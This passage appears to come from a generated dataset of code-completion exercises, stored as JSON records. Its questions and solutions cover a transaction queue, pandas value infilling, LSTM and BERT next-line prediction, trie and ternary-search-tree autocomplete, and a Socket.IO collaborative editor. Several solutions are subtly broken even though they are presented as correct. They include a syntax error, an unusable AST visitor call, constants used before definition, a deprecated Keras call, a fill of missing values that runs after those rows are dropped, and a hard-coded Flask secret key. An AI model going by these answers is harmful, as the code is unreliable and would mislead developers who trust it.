(deposit or withdrawal).\n2. `Deposit` and `Withdrawal` should inherit from `Transaction` and override the `process()` method to perform the respective financial operation on a user's balance.\n3. Implement a `TransactionQueue` class that maintains the order of transactions and processes them atomically.\n4. Ensure thread safety and atomicity in the `TransactionQueue` while handling concurrent deposits and withdrawals.\n\nSolution:\n```python\nimport threading\nfrom time import time\nfrom typing import List\n\nclass Transaction:\n    def __init__(self, timestamp: float, amount: float, transaction_type: str):\n        self.timestamp = timestamp\n        self.amount = amount\n        self.type = transaction_type\n\n    def process(self, balance: float) -> float:\n        raise NotImplementedError\n\nclass Deposit(Transaction):\n    def process(self, balance: float) -> float:\n        return balance + self.amount\n\nclass Withdrawal(Transaction):\n    def process(self, balance: float) -> float:\n        if self.amount <= balance:\n            return balance - self.amount\n        else:\n            raise ValueError(\"Insufficient balance\")\n\nclass TransactionQueue:\n    def __init__(self):\n        self.queue: List[Transaction] = []\n        self.lock = threading.Lock()\n\n    def enqueue(self, transaction: Transaction):\n        with self.lock:\n            self.queue.append(transaction)\n            self.queue.sort(key=lambda x: x.timestamp)\n\n    def process_transactions(self, initial_balance: float) -> float:\n        current_balance = initial_balance\n        with self.lock:\n            while self.queue:\n                transaction = self.queue.pop(0)\n                try:\n                    current_balance = transaction.process(current_balance)\n                except ValueError as e:\n                    print(f\"Transaction failed: {e}\")\n        return current_balance\n\nif __name__ == \"__main__\":\n    queue = TransactionQueue()\n\n    # Simulate concurrent transactions\n    threads = []\n    for _ in range(10):\n        threads.append(threading.Thread(target=queue.enqueue, args=(Deposit(time(), 100, \"deposit\"),)))\n        threads.append(threading.Thread(target=queue.enqueue, args=(Withdrawal(time(), 50, \"withdrawal\"),)))\n\n    for t in threads:\n        t.start()\n\n    for t in threads:\n        t.join()\n\n    final_balance = queue.process_transactions(1000)\n    print(f\"Final balance: {final_balance}\")\n```\n\nConcept: Inheritance"}, {"L2_TASK": "Code completion", "L3_TASK": "Code infilling", "Complexity_Level": "medium", "Response": "{\"Concept\": \"Code Infilling\"}\n\nQuestion 1:\nGiven an incomplete piece of Python code that reads a CSV file and performs some basic data cleaning, but is missing the part that fills missing values with the mean of the column. Your task is to fill in the missing code.\n\n```python\nimport pandas as pd\n\ndef clean_data(file_path):\n    # Load CSV file\n    data = pd.read_csv(file_path)\n    \n    # Drop rows with missing values\n    data = data.dropna()\n    \n    # FILL IN THE MISSING CODE TO REPLACE MISSING VALUES WITH THE MEAN\n    \n    # Save the cleaned data to a new CSV file\n    data.to_csv('cleaned_data.csv', index=False)\n```\n\nSolution:\n```python\nimport pandas as pd\n\ndef clean_data(file_path):\n    # Load CSV file\n    data = pd.read_csv(file_path)\n    \n    # Drop rows with missing values\n    data = data.dropna()\n    \n    # Replace missing values with the mean of the respective column\n    for column in data.columns:\n        if data[column].dtype == 'float64' or data[column].dtype == 'int64':\n            data[column].fillna(data[column].mean(), inplace=True)\n    \n    # Save the cleaned data to a new CSV file\n    data.to_csv('cleaned_data.csv', index=False)\n```\n\nQuestion 2:\nSuppose you have an incomplete JavaScript function that processes an array of objects and calculates the average value of a specific property, but the code to calculate the average is missing. Complete the function.\n\n```javascript\nfunction calculateAverage(arrayOfObjects, propertyToAverage) {\n    let sum = 0;\n    let count = 0;\n    \n    // FILL IN THE MISSING CODE TO CALCULATE THE AVERAGE\n    \n    return average;\n}\n```\n\nSolution:\n```javascript\nfunction calculateAverage(arrayOfObjects, propertyToAverage) {\n    let sum = 0;\n    let count = 0;\n    \n    for (let obj of arrayOfObjects) {\n        if (obj.hasOwnProperty(propertyToAverage)) {\n            sum += obj[propertyToAverage];\n            count++;\n        }\n    }\n    \n    const average = count > 0 ? sum / count : 0;\n    return average;\n}\n```\n\nThese questions test your understanding of working with data in Python (using pandas) and JavaScript, as well as your ability to write code that fills in missing values and calculates averages. The complexity is medium, as it involves basic data manipulation and arithmetic operations."}, {"L2_TASK": "Code completion", "L3_TASK": "Code infilling", "Complexity_Level": "extremely difficult", "Response": "Question 1:\nSuppose you are working on a large codebase in Python with multiple classes, inheritance, and complex method interactions. The codebase has a bug that requires you to modify a private method of a class, but that method is called from various other parts of the code. Implement a code completion solution that can intelligently suggest code changes to fix the bug while preserving the overall structure and functionality of the program.\n\nSolution (Concept: Inheritance, Polymorphism, Debugging):\n```python\nclass BaseClass:\n    def __init__(self):\n        self._private_method()\n\n    def _private_method(self):\n        # Bug: Incorrect calculation\n        result = self.some_attribute * 2\n        self.some_attribute = result\n\nclass DerivedClass(BaseClass):\n    def __init__(self, some_attribute):\n        self.some_attribute = some_attribute\n        super().__init__()\n\ndef main():\n    obj = DerivedClass(10)\n    # After debugging, you found out that the bug is due to multiplication by 2 instead of 3\n    # The fix should be applied to _private_method without breaking the derived class functionality\n\n    # Here, we use introspection to modify the private method\n    from inspect import getmembers, isfunction\n    for name, func in getmembers(BaseClass):\n        if name.startswith(\"_\") and isfunction(func):\n            if func.__name__ == \"_private_method\":\n                def fixed_private_method(self):\n                    # Fixed calculation\n                    result = self.some_attribute * 3\n                    self.some_attribute = result\n                fixed_private_method.__name__ = func.__name__\n                fixed_private_method.__doc__ = func.__doc__\n                fixed_private_method.__module__ = func.__module__\n                setattr(BaseClass, func.__name__, fixed_private_method)\n\n    # Test the fixed private method\n    obj.some_attribute = 15\n    obj._private_method()\n    assert obj.some_attribute == 45\n\nif __name__ == \"__main__\":\n    main()\n```\nQuestion 2:\nIn a JavaScript project using a popular frontend framework like React, you must implement an intelligent code completion tool for a component library. The tool should understand the component hierarchy, props, and state, and suggest code completions for components, props, and state values. Additionally, it should handle complex scenarios like conditional rendering, dynamic imports, and HOCs (Higher-Order Components).\n\nSolution (Concept: React, Higher-Order Components, Code Analysis):\n```javascript\n// Simplified example of a code completion tool function\nfunction intelligentCodeCompletion(componentLibrary, currentComponent) {\n    const componentStack = [currentComponent];\n    const componentsData = {};\n\n    function analyzeComponent(component) {\n        const componentInfo = { props: {}, state: {} };\n        const componentSource = componentLibrary[component];\n\n        if (componentSource) {\n            // Parse component source for props and state\n            // (This is a simplified step; in reality, you would use static analysis tools)\n            const { propTypes, state } = parseComponentSource(componentSource);\n\n            componentInfo.props = propTypes;\n            componentInfo.state = state;\n\n            // Check for HOCs and analyze their wrapped components\n            if (componentSource.hocs) {\n                componentSource.hocs.forEach(hoc => {\n                    const hocComponent = analyzeComponent(hoc);\n                    mergeComponentData(componentInfo, hocComponent);\n                });\n            }\n        }\n\n        return componentInfo;\n    }\n\n    function mergeComponentData(destination, source) {\n        merge(destination.props, source.props);\n        merge(destination.state, source.state);\n    }\n\n    while (componentStack.length) {\n        const component = componentStack.pop();\n        componentsData[component] = analyzeComponent(component);\n        componentStack.push(...componentsData[component].dependencies);\n    }\n\n    return componentsData[currentComponent];\n}\n\n// Usage:\nconst componentLibrary = {\n    // ...library components\n};\n\nconst currentComponent = 'MyComponent';\nconst completions = intelligentCodeCompletion(componentLibrary, currentComponent);\nconsole.log(completions.props); // Suggestions for props\nconsole.log(completions.state); // Suggestions for state\n```\nIn this example, `parseComponentSource` and `merge` functions represent simplified versions of parsing code and merging data. In a real-world scenario, you would use more advanced tools like Babel or TypeScript to analyze the components and their dependencies."}, {"L2_TASK": "Code completion", "L3_TASK": "Predict next line of code", "Complexity_Level": "medium", "Response": "Question 1:\nProblem: Develop a code completion system that uses a predictive model to suggest the next line of code based on the context of the current code snippet. The system should be trained on a dataset of Python code and be able to handle common Python syntax and constructs.\n\nConcept: Natural Language Processing (NLP), Predictive Modeling\n\n```python\nimport tensorflow as tf\nfrom tensorflow.keras.preprocessing.text import Tokenizer\nfrom tensorflow.keras.preprocessing.sequence import pad_sequences\nfrom nltk.corpus import stopwords\nfrom sklearn.model_selection import train_test_split\n\n# Preprocess the dataset (tokenize, pad, split)\ndef preprocess_data(code_snippets, labels):\n    stop_words = set(stopwords.words('english'))\n    tokenized_snippets = [tokenizer.texts_to_sequences([snippet])[0] for snippet in code_snippets]\n    padded_snippets = pad_sequences(tokenized_snippets, maxlen=MAX_LENGTH, padding='post', truncating='post')\n    train_snippets, val_snippets, train_labels, val_labels = train_test_split(padded_snippets, labels, test_size=0.2)\n    return train_snippets, val_snippets, train_labels, val_labels\n\n# Build and train the model\ndef build_model(input_shape):\n    model = tf.keras.Sequential([\n        tf.keras.layers.Embedding(VOCAB_SIZE, EMBEDDING_DIM, input_length=MAX_LENGTH),\n        tf.keras.layers.LSTM(LSTM_UNITS, return_sequences=True),\n        tf.keras.layers.LSTM(LSTM_UNITS),\n        tf.keras.layers.Dense(64, activation='relu'),\n        tf.keras.layers.Dense(VOCAB_SIZE, activation='softmax')\n    ])\n    model.compile(loss='categorical_crossentropy', optimizer='adam', metrics=['accuracy'])\n    return model\n\n# Train the model\ndef train_model(model, train_snippets, train_labels, val_snippets, val_labels, epochs=10):\n    model.fit(train_snippets, train_labels, validation_data=(val_snippets, val_labels), epochs=epochs)\n\n# Given a code snippet, predict the next line\ndef predict_next_line(model, snippet):\n    # Preprocess the snippet\n    padded_snippet = pad_sequences([tokenizer.texts_to_sequences([snippet])], maxlen=MAX_LENGTH, padding='post', truncating='post')\n    prediction = model.predict_classes(padded_snippet, verbose=0)\n    return tokenizer.index_word[prediction[0]]\n\n# Example usage\ncode_snippets = ['def hello_world():', 'print(\"Hello, world!\")']\nlabels = ['pass', 'return']  # The next line would typically be obtained from a dataset\n\ntokenizer = Tokenizer(num_words=VOCAB_SIZE, oov_token='<OOV>')\ntokenizer.fit_on_texts(code_snippets)\nMAX_LENGTH = 50\nVOCAB_SIZE = 10000\nEMBEDDING_DIM = 100\nLSTM_UNITS = 128\n\ntrain_snippets, val_snippets, train_labels, val_labels = preprocess_data(code_snippets, labels)\nmodel = build_model(train_snippets.shape[1:])\ntrain_model(model, train_snippets, train_labels, val_snippets, val_labels)\n\n# Predict the next line for a given snippet\ncurrent_snippet = 'def greet(name):\\n    print(\"Hello, ')\nnext_line = predict_next_line(model, current_snippet)\nprint(next_line)\n```\nQuestion 2:\nProblem: Extend the previous code completion system to handle method calls and their arguments based on the context. The system should predict the method name and its potential arguments given a partially written method call.\n\nConcept: Method Predict"}, {"L2_TASK": "Code completion", "L3_TASK": "Predict next line of code", "Complexity_Level": "extremely difficult", "Response": "Area: \"Code completion\" Sub Area: \"Predict next line of code\"\n\nQuestion 1: Develop a code completion system that, given a partially written Python function with complex logic and nested data structures, predicts the next executable line of code based on the context and usage patterns extracted from a large corpus of Python projects.\n\nChallenge: The system should be able to handle complex control flow, understand the context of imported modules, and predict appropriate function calls or expressions involving nested data structures like dictionaries and lists.\n\nSolution:\n```python\nimport ast\nimport numpy as np\nfrom sklearn.feature_extraction.text import TfidfVectorizer\nfrom sklearn.metrics.pairwise import cosine_similarity\nfrom code_completion.corpus import PythonCorpus\n\nclass CodeCompletionSystem:\n    def __init__(self, corpus_path):\n        self.corpus = PythonCorpus(corpus_path)\n        self.vectorizer = TfidfVectorizer(tokenizer=self.tokenize, preprocessor=self.preprocess)\n        self.code_vectors = self.vectorizer.fit_transform(self.corpus.code snippets)\n    \n    def tokenize(self, code):\n        tree = ast.parse(code)\n        return [node.id for node in ast.walk(tree) if isinstance(node, (ast.Name, ast.Attribute))]\n    \n    def preprocess(self, code):\n        # Implement code normalization and context extraction\n        pass\n    \n    def predict_next_line(self, partial_code):\n        code_vector = self.vectorizer.transform([partial_code])\n        similarity_scores = cosine_similarity(code_vector, self.code_vectors).flatten()\n        \n        top_similar_indices = np.argsort(-similarity_scores)[:5]\n        top_similar_snippets = [self.corpus.code_snippets[index] for index in top_similar_indices]\n        \n        return top_similar_snippets\n\nif __name__ == \"__main__\":\n    corpus_path = \"path/to/large/python/corpus\"\n    code_completer = CodeCompletionSystem(corpus_path)\n    partial_code = \"\"\"\n    def process_data(data: dict):\n        processed_data = {}\n        for key, value in data.items():\n            if isinstance(value, list):\n                processed_data[key] = [item for item in value if item > 5]\n            elif isinstance(value, dict):\n                processed_data[key] = self.\n    \"\"\"\n    next_lines = code_completer.predict_next_line(partial_code)\n    print(next_lines)\n```\nConcept: Natural Language Processing in Code, Text Similarity Metrics\n\nQuestion 2: Create a TypeScript-based IDE plugin that predicts the next line of code in a JavaScript application, focusing on predicting correct usage of asynchronous functions, promises, and error handling patterns found in real-world projects.\n\nChallenge: The plugin should understand the context of the current code block and predict the next line based on common coding patterns, such as awaiting an asynchronous call, handling errors with try-catch, or chaining promises.\n\nSolution:\n```typescript\nimport * as vscode from 'vscode';\n\nclass CodePredictor {\n    private readonly corpus: string[];\n\n    constructor(corpusPath: string) {\n        this.corpus = this.readCorpus(corpusPath);\n    }\n\n    private readCorpus(corpusPath: string) {\n        // Read and process the corpus, extracting code snippets\n    }\n\n    private extractContext(code: string) {\n        // Extract relevant context information from the given code\n    }\n\n    async predictNextLine(code: string): Promise<string[]> {\n        const context = this.extractContext(code);\n        const relevantSnippets = this.filterCorpus(context);\n        const rankedSnippets = this.rankSnippets(relevantSnippets);\n\n        return rankedSnippets;\n    }\n\n    private filterCorpus(context: any) {\n        // Filter snippets from the corpus that match the given context\n    }\n\n    private rankSnippets(snippets: string[]) {\n        // Implement a ranking algorithm based on snippet relevance\n    }\n}\n\nexport function activate(context: vscode.ExtensionContext) {\n    const predictor = new CodePredictor('path/to/corpus');\n    vscode.window.onDidChangeActiveTextEditor(async (editor) => {\n        if (editor && editor.document.languageId === 'javascript') {\n            const currentLine = editor.document.lineAt(editor.selection.active.line);\n            const nextLines = await predictor.predictNextLine(currentLine.text);\n            // Display the predicted lines in a quick pick list in the IDE\n        }\n    });\n}\n```\nConcept: Code Analysis, Asynchronous Programming, Plugin Development"}, {"L2_TASK": "Code completion", "L3_TASK": "Autocomplete code blocks", "Complexity_Level": "medium", "Response": "Question 1:\nProblem: Implement a medium complexity autocompletion system that suggests code blocks based on a user's input. The system should use a Trie data structure to store a dictionary of common code snippets in JavaScript.\n\nConcept: Trie (Prefix Tree)\n\nSolution:\n```python\nclass TrieNode:\n    def __init__(self):\n        self.children = {}\n        self.is_end_of_word = False\n\nclass Trie:\n    def __init__(self):\n        self.root = TrieNode()\n\n    def insert(self, snippet):\n        current = self.root\n        for char in snippet:\n            if char not in current.children:\n                current.children[char] = TrieNode()\n            current = current.children[char]\n        current.is_end_of_word = True\n\n    def search(self, prefix):\n        current = self.root\n        for char in prefix:\n            if char not in current.children:\n                return []\n            current = current.children[char]\n        return self._get_suggestions(current)\n\n    def _get_suggestions(self, node, prefix=\"\"):\n        suggestions = []\n        if node.is_end_of_word:\n            suggestions.append(prefix)\n        for char, child in node.children.items():\n            suggestions.extend(self._get_suggestions(child, prefix + char))\n        return suggestions\n\n# Example usage\ntrie = Trie()\ncode_snippets = [\n    \"function add(a, b) { return a + b; }\",\n    \"if (condition) {\",\n    \"for (let i = 0; i < array.length; i++) {\",\n    \"class MyClass { constructor() { } }\"\n]\n\nfor snippet in code_snippets:\n    trie.insert(snippet)\n\nuser_input = \"fu\"\nsuggestions = trie.search(user_input)\nprint(\"Suggestions for input 'fu':\", suggestions)\n```\nQuestion 2:\nProblem: Develop a medium complexity autocompletion feature for a Python code editor. The feature should use a Ternary Search Tree (TST) to efficiently provide suggestions based on user input. The TST should be able to store function names and their corresponding docstrings.\n\nConcept: Ternary Search Tree (TST)\n\nSolution:\n```python\nclass TSTNode:\n    def __init__(self, char):\n        self.char = char\n        self.left = None\n        self.middle = None\n        self.right = None\n        self.end = False\n        self.data = None\n\nclass TernarySearchTree:\n    def __init__(self):\n        self.root = None\n\n    def insert(self, key, data):\n        if not self.root:\n            self.root = TSTNode(key[0])\n            self.root.data = (key, data)\n        else:\n            self._insert_helper(self.root, key, data, 0)\n\n    def _insert_helper(self, node, key, data, index):\n        if index == len(key):\n            if node.end is False:\n                node.end = True\n            node.data = (key, data)\n            return\n        char = key[index]\n        if char < node.char:\n            if node.left is None:\n                node.left = TSTNode(char)\n            self._insert_helper(node.left, key, data, index)\n        elif char > node.char:\n            if node.right is None:\n                node.right = TSTNode(char)\n            self._insert_helper(node.right, key, data, index)\n        else:\n            if node.middle is None:\n                node.middle = TSTNode(char)\n            self._insert_helper(node.middle, key, data, index + 1)\n\n    def search(self, prefix):\n        node = self.root\n        for char in prefix:\n            if node is None or (char < node.char and node.left is None) or (char > node.char and node.right is None):\n                return []\n            if char < node.char:\n                node = node.left\n            elif char > node.char:\n                node = node.right\n            else:\n                node = node.middle\n        return self._get_suggestions(node, prefix)\n\n    def _get_suggestions(self, node, prefix):\n        suggestions = []\n        if node is not None:\n            if node.end:\n                suggestions.append((node.data[0], node.data[1]))\n            suggestions.extend(self._get_suggestions(node.left, prefix))\n            suggestions.extend(self._get_suggestions(node.middle, prefix))\n            suggestions.extend(self._get_suggestions(node.right, prefix))\n        return suggestions\n\n# Example usage\ntst = TernarySearchTree()\ncode_snippets = {\n    \"print\": \"Prints the given object to the standard output.\",\n    \"len\": \"Returns the number of items in an object.\",\n    \"range\": \"Returns a sequence of numbers.\",\n}\n\nfor func_name, docstring in code_snippets.items():\n    tst.insert(func_name, docstring)\n\nuser_input = \"prin\"\nsuggestions = tst.search(user_input)\nprint(\"Suggestions for input 'prin':\", [(suggestion, data) for suggestion, data in suggestions])\n```\nThese solutions implement autocomplete code blocks using a Trie and a Ternary Search Tree, respectively, for storing code snippets or function names along with their descriptions. The user can input a prefix, and the system will return a list of relevant code snippets or function names."}, {"L2_TASK": "Code completion", "L3_TASK": "Autocomplete code blocks", "Complexity_Level": "extremely difficult", "Response": "Question 1: Develop an AI-powered, context-aware, and language-agnostic autocomplete system that not only suggests code snippets but also predicts the likelihood of a suggested block being used in the current development context.\n\n**Concept**: Natural Language Processing (NLP), Machine Learning (ML), Code Analysis\n\nSolution:\nTo create a complex autocomplete system, we will use a combination of NLP, deep learning, and code analysis techniques. The system will require a large dataset of code snippets and corresponding contexts to train a model capable of predicting the likelihood of a snippet being relevant.\n\nHere's a high-level architecture using Python and TensorFlow:\n\n1. Preprocess the dataset:\n```python\nimport re\n\ndef preprocess_code(code):\n    # Remove comments, strings, and whitespace\n    code = re.sub(r'//.*|\".*?\"|\\'.*?\\'', '', code, flags=re.MULTILINE)\n    code = re.sub(r'\\s+', ' ', code)\n    return code\n\n# Apply preprocessing to your code dataset\npreprocessed_dataset = [preprocess_code(code) for code in code_dataset]\n```\n1. Extract features using NLP techniques:\n```python\nimport tensorflow as tf\nfrom tensorflow.keras.preprocessing.text import Tokenizer\nfrom tensorflow.keras.preprocessing.sequence import pad_sequences\n\ntokenizer = Tokenizer()\ntokenizer.fit_on_texts(preprocessed_dataset)\nsequences = tokenizer.texts_to_sequences(preprocessed_dataset)\npadded_sequences = pad_sequences(sequences, maxlen=1000, padding='post')\n\n# Now you have a numerical representation of your code snippets\n```\n1. Build and train a deep learning model (e.g., Transformer or LSTM):\n```python\nfrom tensorflow.keras.models import Sequential\nfrom tensorflow.keras.layers import Embedding, LSTM, Attention, Dense\n\nmodel = Sequential([\n    Embedding(len(tokenizer.word_index)+1, 128, input_length=1000),\n    LSTM(256, return_sequences=True),\n    Attention(),\n    Dense(256, activation='relu'),\n    Dense(len(code_snippets), activation='softmax')\n])\n\nmodel.compile(loss='categorical_crossentropy', optimizer='adam', metrics=['accuracy'])\nmodel.fit(padded_sequences, labels, epochs=50, batch_size=64)\n```\n1. Given a partially written code block, generate autocomplete suggestions:\n```python\ndef generate_suggestions(partial_code):\n    preprocessed_partial = preprocess_code(partial_code)\n    sequence = tokenizer.texts_to_sequences([preprocessed_partial])\n    predicted_scores = model.predict(pad_sequences(sequence, maxlen=1000, padding='post'))\n    \n    # Find the top N suggestions\n    top_n = 5\n    top_indices = predicted_scores[0].argsort()[-top_n:][::-1]\n    top_suggestions = [code_snippets[index] for index in top_indices]\n    \n    return top_suggestions\n\n# Example usage\npartial_code = 'def some_function(x, y):'\nsuggestions = generate_suggestions(partial_code)\nfor suggestion in suggestions:\n    print(suggestion)\n```\nNote: This is a simplified and high-level explanation. Implementing a real-world, high-performance code autocomplete system would require more advanced techniques, larger datasets, and fine-tuning.\n\nQuestion 2: Develop a real-time collaborative code editing environment with an autocomplete feature that handles concurrent edits, maintains consistency, and updates suggestions based on the changes made by all users.\n\n**Concept**: Distributed Systems, Conflict Resolution, Real-time Communication\n\nSolution:\nFor this problem, we'll use a combination of technologies like Socket.IO for real-time communication, a database for storing code snippets, and a backend server to handle conflicts and updates.\n\n1. Set up a backend server with a database (e.g., MongoDB) to store code snippets:\n```python\n# backend.py\nfrom flask import Flask, request\nfrom flask_socketio import SocketIO, emit\nimport pymongo\n\napp = Flask(__name__)\napp.config['SECRET_KEY'] = 'secret!'\nsocketio = SocketIO(app)\nclient = pymongo.MongoClient(\"mongodb://localhost:27017/\")\ndb = client['code_editing']\ncoll = db['code_snippets']\n\n@socketio.on('connect')\ndef handle_connect():\n    print(\"Client connected\")\n\n@socketio.on('code_update')\ndef handle_code_update(data):\n    user_id, code, snippet_id = data['user_id'], data['code'], data['snippet_id']\n    coll.update_one({'_id': snippet_id}, {'$set': {'content': code, 'last_edit_user': user_id}})\n    emit('code_updated', {'snippet_id': snippet_id, 'code': code}, broadcast=True)\n\n# Run the server\nif __name__ == '__main__':\n    socketio.run(app)\n```\n1. Implement a real-time frontend using JavaScript and Socket.IO:\n```javascript\n// frontend.html\n<!DOCTYPE html>\n<html>\n<head>\n    <script src=\"https://cdn.socket.io/4.4.1/socket.io.min.js\"></script>\n</head>\n<body>\n    <textarea id=\"code-editor\"></textarea>\n    <button id=\"save\">Save</button>\n    <ul id=\"suggestions\"></ul>\n\n    <script>\n        const socket = io('http://localhost:5000');\n        const codeEditor = document.getElementById('code-editor');\n        const saveBtn = document.getElementById('save');\n        const suggestionsList = document.getElementById('suggestions');\n\n        // Initialize autocomplete with local suggestions\n        // ...\n\n        socket.on('connect', () => {\n            console.log('Connected');\n        });\n\n        socket.on('code_updated', (data) => {\n            if (data.snippet_id === currentSnippetId) {\n                codeEditor.value = data.code;\n                // Update autocomplete suggestions based on the new code\n                // ...\n            }\n        });\n\n        saveBtn.addEventListener('click', () => {\n            const code = codeEditor.value;\n            socket.emit('code_update', { user_id: userId, code, snippet_id: currentSnippetId });\n        });\n    </script>\n</body>\n</html>\n```\n1. Implement autocomplete functionality using an AI model, as described in the previous solution.\n\nThis setup allows for real-time collaboration, but conflict resolution would need to be added to handle cases where two users edit the same snippet simultaneously. This could involve using operational transforms or version control techniques like Git.\n\nNote: This is a simplified example and doesn't include conflict resolution or a full-featured autocomplete system. A production-ready solution would require more extensive development, testing, and integration with existing tools."}, {"L2_TASK": "Code completion", "L3_TASK": "Variable name suggestion", "Complexity_Level": "medium", "Response": "Question 1:\nProblem: Develop a code completion tool that suggests variable names based on the context and previously used variable names in the code. The tool should analyze the code, identify relevant keywords, and offer suggestions when a user starts typing a new variable name.\n\nSolution:\nConcept: Natural Language Processing (NLP), Text Analysis\n\nLanguage: Python\n\n```python\nimport re\nfrom collections import Counter\n\ndef suggest_variable_names(code, prefix):\n    # Tokenize the code into words\n    words = re.findall(r'\\b\\w+\\b', code)\n    \n    # Filter out words that start with the given prefix\n    filtered_words = [word for word in words if word.startswith(prefix)]\n    \n    # Count the frequency of filtered words\n    word_counts = Counter(filtered_words)\n    \n    # Sort suggestions by frequency, then alphabetically\n    suggestions = sorted(word_counts.items(), key=lambda x: (-x[1], x[0]))\n    \n    # Return only the variable names (not the counts)\n    return [suggestion[0] for suggestion in suggestions]\n\n# Example usage\ncode = \"\"\"\ndef calculate_total(quantity, price):\n    subtotal = quantity * price\n    tax = subtotal * 0.08\n    total = subtotal + tax\n    return total\n\"\"\"\n\nprefix = \"t\"\nsuggestions = suggest_variable_names(code, prefix)\nprint(suggestions)  # Output: ['total', 'tax', 'subtotal']\n```\n\nQuestion 2:\nProblem: Enhance the code completion tool to include suggestions based on the variable type. Analyze the code to determine the data types of existing variables and offer suggestions that are semantically relevant to the given variable type.\n\nSolution:\nConcept: Code Analysis, Semantic Analysis\n\nLanguage: Python\n\n```python\nimport ast\nfrom collections import defaultdict\n\ndef infer_variable_types(code):\n    tree = ast.parse(code)\n    var_types = defaultdict(set)\n\n    def visit_assign(node):\n        if isinstance(node.value, ast.Call):\n            func_name = node.value.func.id\n            if func_name in ['int', 'float', 'str']:\n                var_types[node.targets[0].id].add(func_name)\n        elif isinstance(node.value, ast.Num):\n            var_types[node.targets[0].id].add(type(node.value.n).__name__)\n\n    ast.NodeVisitor().visit(tree)(visit_assign)\n\n    return var_types\n\ndef suggest_variable_names_based_on_type(code, prefix, var_type):\n    var_types = infer_variable_types(code)\n    relevantSuggestions = []\n\n    for var, types in var_types.items():\n        if var.startswith(prefix) and var_type in types:\n            relevantSuggestions.append(var)\n\n    # Sort suggestions alphabetically\n    relevantSuggestions.sort()\n    \n    return relevantSuggestions\n\n# Example usage\ncode = \"\"\"\ndef calculate_total(quantity: int, price: float):\n    subtotal = quantity * price\n    total = subtotal + 10.0\n    message = f\"Total: {total}\"\n\"\"\"\n\nprefix = \"t\"\nvar_type = \"float\"\nsuggestions = suggest_variable_names_based_on_type(code, prefix, var_type)\nprint(suggestions)  # Output: ['total']\n```\n\nThese solutions demonstrate how to create a code completion tool that suggests variable names based on context and variable types. The first solution focuses on context, while the second solution adds a semantic analysis layer to suggest names based on the variable type."}, {"L2_TASK": "Code completion", "L3_TASK": "Variable name suggestion", "Complexity_Level": "extremely difficult", "Response": "Question 1: Develop a sophisticated code completion system that uses advanced natural language processing (NLP) and deep learning techniques to provide accurate variable name suggestions based on the context and semantic meaning of the code. The system should be able to handle multiple programming languages, understand the domain-specific terms, and learn from a vast code corpus to improve its suggestions over time.\n\nSolution:\nTo create such a system, we'll use a combination of NLP, deep learning, and programming language understanding techniques. Python will be the primary language for this implementation, utilizing libraries like NLTK, Spacy, TensorFlow, and PyTorch.\n\n```python\nimport nltk\nimport spacy\nimport tensorflow as tf\nimport torch\nfrom transformers import BertTokenizer, BertModel\n\n# Load pre-trained BERT model and tokenizer\ntokenizer = BertTokenizer.from_pretrained('bert-base-uncased')\nmodel = BertModel.from_pretrained('bert-base-uncased')\n\ndef preprocess_code(code, language):\n    # Tokenize and preprocess the code based on the language\n    if language == 'Python':\n        # Use Python-specific tokenizer or lexer\n        tokens = tokenize_python(code)\n    elif language == 'Java':\n        tokens = tokenize_java(code)\n    # ... handle other languages\n\n    return tokens\n\ndef encode_code(tokens, tokenizer):\n    # Encode the tokens using BERT tokenizer\n    input_ids = tokenizer(tokens, padding=True, truncation=True, max_length=512, return_tensors='pt')['input_ids']\n    return input_ids\n\ndef get_variable_suggestions(input_ids, model):\n    # Forward pass through BERT model\n    with torch.no_grad():\n        output = model(input_ids)\n        # Extract contextualized embeddings for the last token\n        last_layer_embeddings = output.last_hidden_state[:, -1, :]\n\n    # Perform dimensionality reduction, clustering, or similarity analysis to generate suggestions\n    # This part is complex and might involve fine-tuning a downstream model, using NMF, or training a classifier\n    # For simplicity, we'll skip the implementation here\n\ndef tokenize_python(code):\n    # Implement Python-specific tokenization\n    # ...\n    return tokens\n\ndef tokenize_java(code):\n    # Implement Java-specific tokenization\n    # ...\n    return tokens\n\n# Example usage\ncode = \"\"\"\ndef calculate_sales_tax(price, state):\n    if state == 'CA':\n        tax_rate = 0.09\n    elif state == 'NY':\n        tax_rate = 0.08\n    else:\n        tax_rate = 0.06\n    tax_amount = price * tax_rate\n    return tax_amount\n\"\"\"\n\ntokens = preprocess_code(code, 'Python')\ninput_ids = encode_code(tokens, tokenizer)\nsuggestions = get_variable_suggestions(input_ids, model)\n```\n\nQuestion 2: Implement a real-time code completion system that integrates with a code editor and suggests variable names based on the current code context, the developer's coding history, and collaborator activity. The system should handle concurrency and efficiently update suggestions as the code is being typed.\n\nSolution:\nFor this problem, we'll develop a client-server architecture using WebSocket for real-time communication and a database to store coding history. The server will be built with Node.js using the Express framework, and the client-side integration will be done using a code editor extension.\n\nServer (Node.js with Express and WebSocket):\n\n```javascript\nconst express = require('express');\nconst WebSocket = require('ws');\nconst MongoClient = require('mongodb').MongoClient;\n\nconst app = express();\nconst server = require('http').createServer(app);\nconst wss = new WebSocket.Server({ server });\n\n// Connect to MongoDB\nMongoClient.connect('mongodb://localhost:27017/code_completion', (err, client) => {\n  if (err) throw err;\n  console.log('Connected to MongoDB');\n  const db = client.db('code_completion');\n  const codingHistoryColl = db.collection('coding_history');\n  \n  wss.on('connection', (ws) => {\n    ws.on('message', (message) => {\n      const data = JSON.parse(message);\n      // Process code context and user history\n      const suggestions = generateSuggestions(data.context, data.history, data.collaborators);\n      \n      ws.send(JSON.stringify({ type: 'suggestions', data: suggestions }));\n    });\n  });\n});\n\nfunction generateSuggestions(context, history, collaborators) {\n  // Implement suggestion generation using context, history, and collaborator data\n  // ...\n  return suggestions;\n}\n\nserver.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});\n```\n\nClient-side (Code editor extension using JavaScript):\n\n```javascript\nconst ws = new WebSocket('ws://localhost:3000');\n\nws.onopen = () => {\n  console.log('Connected to server');\n};\n\nws.onmessage = (event) => {\n  const message = JSON.parse(event.data);\n  if (message.type === 'suggestions') {\n    displaySuggestions(message.data);\n  }\n};\n\nfunction onCodeChange(code) {\n  const context = extractContext(code);\n  const userHistory = fetchUserCodingHistory();\n  const collaboratorActivity = fetchCollaboratorActivity();\n\n  ws.send(JSON.stringify({ context, history: userHistory, collaborators: collaboratorActivity }));\n}\n\n// Implement code context extraction, user history fetching, and collaborator activity fetching\n// ...\n```\n\nThese problems represent complex scenarios that require expertise in NLP, deep learning, real-time communication, and integrating with code editors. They showcase the challenge of developing a code completion system that can handle multiple programming languages, learn from context, and provide real-time suggestions."}, {"L2_TASK": "Code completion", "L3_TASK": "Method signature completion", "Complexity_Level": "medium", "Response": "Question 